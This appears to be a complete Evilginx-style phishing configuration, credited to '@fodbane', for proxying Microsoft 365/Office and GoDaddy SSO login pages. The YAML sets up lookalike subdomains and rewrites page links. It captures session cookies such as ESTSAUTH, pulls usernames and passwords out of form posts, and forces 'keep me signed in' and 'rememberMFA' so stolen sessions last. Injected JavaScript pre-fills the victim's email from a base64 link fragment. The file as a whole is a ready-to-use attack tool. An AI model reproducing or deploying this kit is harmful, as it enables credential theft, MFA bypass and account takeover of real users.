name: 'office'
author: '@fodbane'
min_ver: '3.3.0'


proxy_hosts:
  - {phish_sub: 'loq', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true} # change for login domain change
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing:false}
  - {phish_sub: 'lo', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false} # also cn be used for login if u chnage landing domain
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false} 
  - {phish_sub: 'so', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false} # can handle adfs
  - {phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing:false}
  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing:false}
  
sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetSessionState.srf', replace: 'https://{hostname}/GetSessionState.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie', 'WLSSC', 'RPSSecAuth', '.*,regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['SignInStateCookie', '.*,regexp']
  - domain: 'login.live.com'
    keys: ['.*,regexp']
  - domain: '.login.live.com'
    keys: ['.*,regexp']
  - domain: '.live.com'
    keys: ['.*,regexp']

force_post:
  - path: "/ppsecure/post*" # stay alwas logged in or trust this device
    search:
      - { key: "LoginOptions", search: "1" }
    force:
      - { key: "DontShowAgain", value: "true" }
    type: "post"

  - path: '/kmsi'
    search:
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'

  - path: '/common/SAS'
    search:
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'



auth_urls:
  - '/kmsi' # can keep simple with / also
  - '/?auth=2'
  - '/common/login'
  - '/common/oauth2/'
  - '/landingv2*'
  - "/ppsecure/*"
  - "/ppsecure/post.srf*"
  - "/landing*"
  - '/common/SAS/ProcessAuth'
credentials:
  username:
    key: ""
    search: '"username":"([^"]*)'
    type: "json"
  password:
    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
    search: '(.*)'
    type: "post"
  custom:
    - key: (login|UserName|username|email|account)
      search: '(.*)'
    - key: ""
      search: '"password":"([^"]*)'
      type: "json"

login:
  domain: 'login.microsoftonline.com'
  path: '/'

js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    trigger_paths: ["/common/oauth2/", "/", "/*", '/common/oauth2/v2.0/authorize']
    script: |
      function lp(){
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        var query = window.location.href;
        if (/#/.test(window.location.href)){
        var res = query.split("#");
        var data1 = res[0];
        var data2 = res[1];
        console.log(data1);
        console.log(data2);
        if (emailId != null) {
        var decodedString = data2;
        if (/^[A-Za-z0-9+/=]+$/.test(data2)) { // check if string is base64 encoded
        try {
          decodedString = window.atob(data2.replace(/[=]/gi, ''));
        } catch (e) {
          console.error('Error decoding base64 string:', e);
        }
      }
      emailId.focus();
      emailId.value = decodedString;
      nextButton.focus();
      nextButton.click();
      console.log("YES!");
      return;
            }
        }
         setTimeout(function(){lp();}, 500);
        }
        setTimeout(function(){lp();}, 500);
  
      function getFragment() {
              return window.location.hash.substring(1); 
            }
            function lp(){
              const username = getFragment();
              var newele =document.getElementsByName("loginfmt")[0]
                    if (username && newele ) {
                        document.getElementsByName("loginfmt")[0].value = username;
                    }
              setTimeout(function(){lp();}, 100);
            }
      setTimeout(function(){lp();}, 100);
